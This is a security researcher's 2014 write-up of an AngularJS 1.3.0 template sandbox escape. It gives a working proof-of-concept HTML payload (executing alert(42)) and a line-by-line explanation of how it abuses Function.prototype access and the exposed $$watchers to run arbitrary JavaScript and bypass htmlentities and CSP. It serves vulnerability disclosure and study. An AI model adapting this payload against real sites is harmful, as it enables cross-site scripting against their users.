---
layout:     post
title:      An AngularJS Template Expression Sandbox Escape
date:       2014-11-09 00:00
canonical:  https://gist.github.com/molnarg/5348cd4254cabc1d4f7b
---

Short Proof of Concept
----------------------

```html
<!doctype html>
<html>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0/angular.js">
    </script>
</head>
<body ng-app>
    {{ "{{" }}
    !ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(42);'
        ))
    );
    }}
</body>
</html>
```

See also on jsfiddle [with HTML entities escaping](http://jsfiddle.net/cm7n1ug4/3/) and [without escaping](http://jsfiddle.net/uesh50vo/).

AngularJS Template Expression Sandbox Escapes in General
--------------------------------------------------------

AngularJS has a rich client side templating system that accepts JavaScript expressions wrapped in double curly braces (mustache style templating). The template code is interpreted by an interpreter written in JS itself, and prevents the template code from accessing the DOM, and sensitive objects and functions (`eval()`, `Function()`, `bind()`, `apply()`, `call()` etc.) that would allow arbitrary JS execution.

Bugs in this sandbox mechanism can lead to XSS when mixing client side and server side templating like this:

```html
<div ng-app>
{{ '<?php echo $username; ?>' === 'admin' ? 'You are admin!' : 'You are not admin!' }}
</div>
```

But why would you want to trick the sandboxing code when you can simply create a `<script>` tag just like in a regular XSS without much hassle? The answer is that you can bypass XSS protection mechanisms like these:

1. `<?php echo htmlentities($username) ?>` and `<?php echo htmlspecialchars($username) ?>` won't help this time. It prevents creating HTML tags, but the JS template code will be interpreted and sandbox escape will still work.
2. It bypasses a strict [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/Security/CSP) defined to prevent XSS attack. In this case, no `<script>` tags are created, the code is executed by Angular. 

See also: [AngularJS sandbox escapes on the Mustache Security Wiki](https://code.google.com/p/mustache-security/wiki/AngularJS#Sandbox_Bypasses)

Bugs Abused
-----------

The sandbox bypass abuses three bugs:

1. It is possible to access the Function prototype as
   `toString.constructor.prototype`.
2. The `$$watchers` array is exposed on the scope and this makes it possible
   to call the template recursively with a given new scope.
3. When the scope is `Function.prototype`, `apply`, `bind` and `call` are
   all accessible and overwriteable (but not callable).

(1) is actually not new and was used in previous sandbox escapes as well,
but it seems like it was not fixed. I believe that (2) and (3) are new.

Detailed Explanation
--------------------

The first line ensures that the expression evaluates at most once per scope.
This is needed only to avoid the payload JS code from executing more than
once.

        !ready && (ready = true) && (

The whole payload will execute in two different contexts: first with the
original one, and later with `Function.prototype`. The following conditional
expression separates the code that should be executed in the main context
and the other context. We assume that `call` is only defined in the function
prototype context, so the main context code is the first branch and the
function prototype code is the second branch.

          !call
          ? ...
          : ...

The main context code runs first. It calls the template recursively with
`Function.prototype` as context. It is made possible by the exposed
`$$watchers[0].get` function which evaluates the current template with a
given scope. `Function.prototype` is not accessible directly, but we can use
`toString.constructor.prototype` instead.

          ? $$watchers[0].get(toString.constructor.prototype)

The following lines evaluate only when the context is `Function.prototype`.
The first line saves a reference to `apply` to temporary variable on the
scope.

          : (a = apply) &&

The next two lines is equivalent to `Function.prototype.apply = Function` and
`Function.prototype.valueOf = Function.prototype.call`. These will be used
for tricking Angular into instantiating and calling a function for us in the
next step.

            (apply = constructor) &&
            (valueOf = call) &&

The following line first triggers the creation of a function with the code
given as argument to the `toString` method and then calls the method:

            (''+''.toString('js code'))

When interpreting `''.toString( ... )`, Angular actually uses `apply` to
invoke the method. With this in mind, and considering the previously
overwritten methods, the previous line is equivalent to these:

            (''+toString.apply('', ['js code']))
            (''+Function.prototype.apply.call(toString, '', ['js code']))
            (''+Function('', ['js code']))
            (''+Function('', 'js code'))
            (''+function() { js code })

The newly created function will be converted to string because of the '+'
operator, and as part of this process, the previously overwritten `valueOf`
method is called:

            (''+function() { js code }.valueOf())
            (''+function() { js code }.call())
            (''+eval('js code'))


The actual JS code first restores every change to the Function class:

              'F = Function.prototype;' +
              'F.apply = F.a;' +
              'delete F.a;' +
              'delete F.valueOf;' +

and the executes the main payload:

              'alert(42);'

Acknowledgements
----------------

Thanks for [Mathias Karlsson](https://twitter.com/avlidienbrunn) for inspiring this work with his [previous sandbox escape](https://twitter.com/avlidienbrunn/status/513978256790663168), and the AngularJS team for quickly fixing the vulnerability. The fix has been released as part of [AngularJS 1.3.2](https://github.com/angular/angular.js/blob/master/CHANGELOG.md#132-cardiovasculatory-magnification-2014-11-07).
